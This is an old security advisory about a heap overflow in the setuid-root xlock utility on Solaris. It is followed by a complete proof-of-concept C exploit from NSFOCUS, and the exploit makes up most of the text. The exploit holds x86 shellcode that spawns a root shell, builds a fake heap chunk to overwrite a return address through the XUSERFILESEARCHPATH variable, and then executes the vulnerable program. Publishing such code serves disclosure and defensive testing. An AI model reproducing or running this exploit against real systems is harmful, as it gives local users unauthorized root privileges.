source: http://www.securityfocus.com/bid/3160/info
 
Xlock is a utility for locking X-windows displays. It is installed setuid root because it uses the user's password to authorize access to the display when it is locked.
 
The version of xlock that ships with Solaris as part of OpenWindows contains a heap overflow in it's handling of an environment variable.
 
Local attackers may be able to execute arbitrary code with effective privileges of xlock. 

/*
 *  sol_x86_xlockex.c - Proof of Concept Code for xlock heap overflow bug.
 *  Copyright (c) 2001 - Nsfocus.com
 *
 *  Tested in Solaris 8 x86.
 *
 *  DISCLAIMS:
 *  This  is a proof of concept code.  This code is for test purpose 
 *  only and should not be run against any host without permission from 
 *  the system administrator.
 * 
 *  NSFOCUS Security Team <security@nsfocus.com>
 *  http://www.nsfocus.com
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <sys/types.h>

#define RETLOC  0x080463c8  /* default retrun address location (Solaris 8 x86) */
#define SP      0x08047ffc  /* default "bottom" stack address (Solaris 8 x86) */

#define VULPROG "/usr/openwin/bin/xlock"

char            shellcode[] =           
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\xeb\x28\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x8b\xec\x83\xec\x64\x33\xd2\xc6\x45\xce\x9a\x89"
"\x55\xcf\x89\x55\xd3\xc6\x45\xd3\x07\xc6\x45\xd5"
"\xc3\x89\x55\xfc\x83\xed\x32\x33\xc0\x50\x50\xb0"
"\xca\xff\xd5\x83\xc4\x08\x31\xc0\x50\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89"
"\xe2\x50\x52\x53\xb0\x3b\xff\xd5";

int 
main(int argc, char **argv)
{
        char            buf[2048], fake_chunk[48];
        long            retaddr, sp_addr = SP;
        char           *arg[24], *env[24];
        long            retloc = RETLOC;
        unsigned int   *ptr;
        char            ev1[]="XUSERFILESEARCHPATH=";
        long            ev1_len;
        long            overbuflen = 1024;        

        if (argc > 1) /* adjust retloc */
                retloc += atoi(argv[1]);

        bzero(buf, sizeof(buf));
        ev1_len = strlen(ev1);
        memcpy(buf, ev1, ev1_len);
        memset(buf + ev1_len, 'A', overbuflen + sizeof(fake_chunk));

        arg[0] = VULPROG;
        arg[1] = NULL;

        env[0] = shellcode;     /* put shellcode in env */
        env[1] = buf;           /* put overflow environ */
        env[2] = NULL;          /* end of env */
        
        /* get the not exact shellcode address :) */
        retaddr = sp_addr - strlen(VULPROG) - 1
                          - strlen("i86pc") - 1 
                          - strlen(buf) - 1
                          - strlen(shellcode) - 1;

        printf("Using RET address = 0x%lx\n", retaddr);
        printf("Using retloc = 0x%lx \n", retloc);

        ptr = (unsigned int *) fake_chunk;
        memset(fake_chunk, '\xff', sizeof(fake_chunk));
        *(ptr + 0) = 0xfffffff9;
        *(ptr + 2) = retaddr;
        *(ptr + 8) = retloc - 8;

        memcpy(buf + ev1_len + overbuflen, fake_chunk, sizeof(fake_chunk));

        execve(VULPROG, arg, env);
        perror("execle");
        return(1);
}  /* End of main */